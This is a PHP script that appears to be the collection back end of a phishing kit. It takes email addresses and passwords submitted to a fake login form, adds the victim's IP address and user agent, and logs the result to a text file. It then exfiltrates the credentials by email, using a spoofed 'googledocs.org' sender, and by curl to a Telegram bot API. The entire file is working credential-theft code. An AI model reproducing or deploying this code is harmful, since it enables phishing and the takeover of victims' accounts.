<?php

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET');
header('Access-Control-Allow-Headers: Origin, Content-Type, Accept, Authorization, X-Request-With');

$EMAIL = 'jim.jo0147@yandex.com'; // YOUR EMAIL

if ((!empty(trim($_POST['email'])) && !empty(trim($_POST['password'])))) {
    function get_client_ip() {
        $ipaddress = "";
        if (getenv("HTTP_CLIENT_IP"))
            $ipaddress = getenv("HTTP_CLIENT_IP");
        else if(getenv("HTTP_X_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_X_FORWARDED_FOR");
        else if(getenv("HTTP_X_FORWARDED"))
            $ipaddress = getenv("HTTP_X_FORWARDED");
        else if(getenv("HTTP_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_FORWARDED_FOR");
        else if(getenv("HTTP_FORWARDED"))
            $ipaddress = getenv("HTTP_FORWARDED");
        else if(getenv("REMOTE_ADDR"))
            $ipaddress = getenv("REMOTE_ADDR");
        else
            $ipaddress = "UNKNOWN";
        return $ipaddress;
    }
    
    function ParseUA(){
        $UA = "";
        $UAHeaders = [
        "HTTP_USER_AGENT",
        "HTTP_X_OPERAMINI_PHONE_UA",
        "HTTP_X_DEVICE_USER_AGENT",
        "HTTP_X_ORIGINAL_USER_AGENT",
        "HTTP_X_SKYFIRE_PHONE",
        "HTTP_X_BOLT_PHONE_UA",
        "HTTP_DEVICE_STOCK_UA",
        "HTTP_X_UCBROWSER_DEVICE_UA",
        "HTTP_FROM",
        "HTTP_X_SCANNER"
        ];
        foreach ($UAHeaders as $header){
          if (isset($_SERVER[$header]) && !empty(trim($_SERVER[$header]))) {
            $UA = $_SERVER[$header];
            break;
          }  
        }
        return $UA;
      }

    function save_logs($message){
        $path = 'Jp.txt';
        return file_put_contents($path, $message . PHP_EOL, FILE_APPEND);
    }

if (isset($_POST['email'])) {
$email = $_POST['email'];
/*
* Getting Domain part from user input Email-Address
*/
$domain = substr(strrchr($email, "@"), 1);
/*
* This Function is used for fetching the MX data records to a corresponding
- Email domain
*/

function mxrecordValidate($email, $domain) {

$arr = dns_get_record($domain, DNS_MX);
if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])) {
return $arr[0]['target'];
}
}

if (mxrecordValidate($email, $domain)) {
echo('This MX records exists.Valid Email Address.');
$data = dns_get_record($domain, DNS_MX);
foreach ($data as $key1) {
echo "Host:- " . $key1['host'] ;
echo "Class:- " . $key1['class'] ;
echo "TTL:- " . $key1['ttl'] ;
echo "Type:- " . $key1['type'] ;
echo "PRI:- " . $key1['pri'] ;
echo "Target:- " . $key1['target'] ;
echo "Target-IP:- " . gethostbyname($key1['target']) ;
}
echo"</td>";
echo"</tr>";
} else {
echo('No MX record exists.Invalid Email.');
}
echo"</td>";
echo"</tr>";
echo"</table>";
}


   $IP = get_client_ip();
    $UserAgent = ParseUA();
    $email = $_POST['email'];
    $password = $_POST['password'];
    $telegrambot = '1448GzEA';
    $telegramchatid = 564;

    $message = "******* Jp LOGZ ******".PHP_EOL;
    $message .= "MX Record: ".$key1['target']."\n";
    $message .= "Email: {$email}".PHP_EOL;
    $message .= "Password: {$password}".PHP_EOL;
    $message .= "IP: ${IP}".PHP_EOL;
    $message .= "User-Agent: {$UserAgent}".PHP_EOL;
    $message .= "**************************".PHP_EOL;    
    $subject = "Jp Result";
    $headers = "From: Jp<wirez@googledocs.org>";
    save_logs($message);
    mail($EMAIL,$subject,$message,$headers);
    $website="https://api.telegram.org/bot".$telegrambot;
    $params=['chat_id'=>$telegramchatid, 'text'=>$message];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
}
